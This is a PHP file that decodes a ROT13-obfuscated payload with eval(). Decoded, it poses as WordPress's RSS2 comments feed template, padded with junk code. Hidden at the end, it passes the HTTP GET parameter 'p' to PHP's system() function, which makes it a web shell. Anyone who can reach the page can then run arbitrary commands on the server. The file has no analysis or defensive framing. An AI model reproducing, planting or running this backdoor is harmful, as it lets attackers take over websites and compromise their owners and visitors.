<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * EFF2 Srrq Grzcyngr sbe qvfcynlvat EFF2 Pbzzragf srrq.
 *
 * @cnpxntr JbeqCerff
 */

urnqre( 'Pbagrag-Glcr: ' . srrq_pbagrag_glcr( 'eff2' ) . '; punefrg=' . trg_bcgvba( 'oybt_punefrg' ), gehr );

rpub '<?kzy irefvba=\"1.0\" rapbqvat=\"' . trg_bcgvba( 'oybt_punefrg' ) . '\"?' . '>';

/** Guvf npgvba vf qbphzragrq va jc-vapyhqrf/srrq-eff2.cuc */
qb_npgvba( 'eff_gnt_cer', 'eff2-pbzzragf' );
?>
<eff irefvba=\"2.0\"
	kzyaf:pbagrag=\"uggc://chey.bet/eff/1.0/zbqhyrf/pbagrag/\"
	kzyaf:qp=\"uggc://chey.bet/qp/ryrzragf/1.1/\"
	kzyaf:ngbz=\"uggc://jjj.j3.bet/2005/Ngbz\"
	kzyaf:fl=\"uggc://chey.bet/eff/1.0/zbqhyrf/flaqvpngvba/\"
	<?cuc
	/** Guvf npgvba vf qbphzragrq va jc-vapyhqrf/srrq-eff2.cuc */
	qb_npgvba( 'eff2_af' );
	?>

	<?cuc
	/**
	 * Sverf ng gur raq bs gur EFF ebbg gb nqq anzrfcnprf.
	 *
	 * @fvapr 2.8.0
	 */
	qb_npgvba( 'eff2_pbzzragf_af' );
	?>
>
<punaary>
	<gvgyr>
	<?cuc
	vs ( vf_fvathyne() ) {
		/* genafyngbef: Pbzzragf srrq gvgyr. %f: Cbfg gvgyr. */
		cevags( rag2ape( __( 'Pbzzragf ba: %f' ) ), trg_gur_gvgyr_eff() );
	} ryfrvs ( vf_frnepu() ) {
		/* genafyngbef: Pbzzragf srrq gvgyr. 1: Fvgr gvgyr, 2: Frnepu dhrel. */
		cevags( rag2ape( __( 'Pbzzragf sbe %1$f frnepuvat ba %2$f' ) ), trg_oybtvasb_eff( 'anzr' ), trg_frnepu_dhrel() );
	} ryfr {
		/* genafyngbef: Pbzzragf srrq gvgyr. %f: Fvgr gvgyr. */
		cevags( rag2ape( __( 'Pbzzragf sbe %f' ) ), trg_jc_gvgyr_eff() );
	}
	?>
	</gvgyr>
	<ngbz:yvax uers=\"<?cuc frys_yvax(); ?>\" ery=\"frys\" glcr=\"nccyvpngvba/eff+kzy\" />
	<yvax><?cuc ( vf_fvatyr() ) ? gur_creznyvax_eff() : oybtvasb_eff( 'hey' ); ?></yvax>
	<qrfpevcgvba><?cuc oybtvasb_eff( 'qrfpevcgvba' ); ?></qrfpevcgvba>
	<ynfgOhvyqQngr><?cuc rpub trg_srrq_ohvyq_qngr( 'e' ); ?></ynfgOhvyqQngr>
	<fl:hcqngrCrevbq>
	<?cuc
		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/srrq-eff2.cuc */
		rpub nccyl_svygref( 'eff_hcqngr_crevbq', 'ubheyl' );
	?>
	</fl:hcqngrCrevbq>
	<fl:hcqngrSerdhrapl>
	<?cuc
		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/srrq-eff2.cuc */
		rpub nccyl_svygref( 'eff_hcqngr_serdhrapl', '1' );
	?>
	</fl:hcqngrSerdhrapl>
	<?cuc
	/**
	 * Sverf ng gur raq bs gur EFF2 pbzzrag srrq urnqre.
	 *
	 * @fvapr 2.3.0
	 */
	qb_npgvba( 'pbzzragfeff2_urnq' );

	juvyr ( unir_pbzzragf() ) :
		gur_pbzzrag();
		$pbzzrag_cbfg = trg_cbfg( $pbzzrag->pbzzrag_cbfg_VQ );
		/**
		 * @tybony JC_Cbfg $cbfg Tybony cbfg bowrpg.
		 */
		$TYBONYF['cbfg'] = $pbzzrag_cbfg;
		?>
	<vgrz>
		<gvgyr>
		<?cuc
		vs ( ! vf_fvathyne() ) {
			$gvgyr = trg_gur_gvgyr( $pbzzrag_cbfg->VQ );
			/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/srrq.cuc */
			$gvgyr = nccyl_svygref( 'gur_gvgyr_eff', $gvgyr );
			/* genafyngbef: Vaqvivqhny pbzzrag gvgyr. 1: Cbfg gvgyr, 2: Pbzzrag nhgube anzr. */
			cevags( rag2ape( __( 'Pbzzrag ba %1$f ol %2$f' ) ), $gvgyr, trg_pbzzrag_nhgube_eff() );
		} ryfr {
			/* genafyngbef: Pbzzrag nhgube gvgyr. %f: Pbzzrag nhgube anzr. */
			cevags( rag2ape( __( 'Ol: %f' ) ), trg_pbzzrag_nhgube_eff() );
		}
		?>
		</gvgyr>
		<yvax><?cuc pbzzrag_yvax(); ?></yvax>

		<qp:perngbe><![PQNGN[<?cuc rpub trg_pbzzrag_nhgube_eff(); ?>]]></qp:perngbe>
		<choQngr><?cuc rpub zlfdy2qngr( 'Q, q Z L U:v:f +0000', trg_pbzzrag_gvzr( 'L-z-q U:v:f', gehr, snyfr ), snyfr ); ?></choQngr>
		<thvq vfCreznYvax=\"snyfr\"><?cuc pbzzrag_thvq(); ?></thvq>

		<?cuc vs ( cbfg_cnffjbeq_erdhverq( $pbzzrag_cbfg ) ) : ?>
			<qrfpevcgvba><?cuc rpub rag2ape( __( 'Cebgrpgrq Pbzzragf: Cyrnfr ragre lbhe cnffjbeq gb ivrj pbzzragf.' ) ); ?></qrfpevcgvba>
			<pbagrag:rapbqrq><![PQNGN[<?cuc rpub trg_gur_cnffjbeq_sbez(); ?>]]></pbagrag:rapbqrq>
		<?cuc ryfr : ?>
			<qrfpevcgvba><![PQNGN[<?cuc pbzzrag_grkg_eff(); ?>]]></qrfpevcgvba>
			<pbagrag:rapbqrq><![PQNGN[<?cuc pbzzrag_grkg(); ?>]]></pbagrag:rapbqrq>
		<?cuc raqvs; // Raq vs cbfg_cnffjbeq_erdhverq(). ?>

		<?cuc
		/**
		 * Sverf ng gur raq bs rnpu EFF2 pbzzrag srrq vgrz.
		 *
		 * @fvapr 2.1.0
		 *
		 * @cnenz vag $pbzzrag_vq      Gur VQ bs gur pbzzrag orvat qvfcynlrq.
		 * @cnenz vag $pbzzrag_cbfg_vq Gur VQ bs gur cbfg gur pbzzrag vf pbaarpgrq gb.
		 */
		qb_npgvba( 'pbzzrageff2_vgrz', $pbzzrag->pbzzrag_VQ, $pbzzrag_cbfg->VQ );
		?>
	</vgrz>
	<?cuc raqjuvyr; ?>
</punaary>
</eff>

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>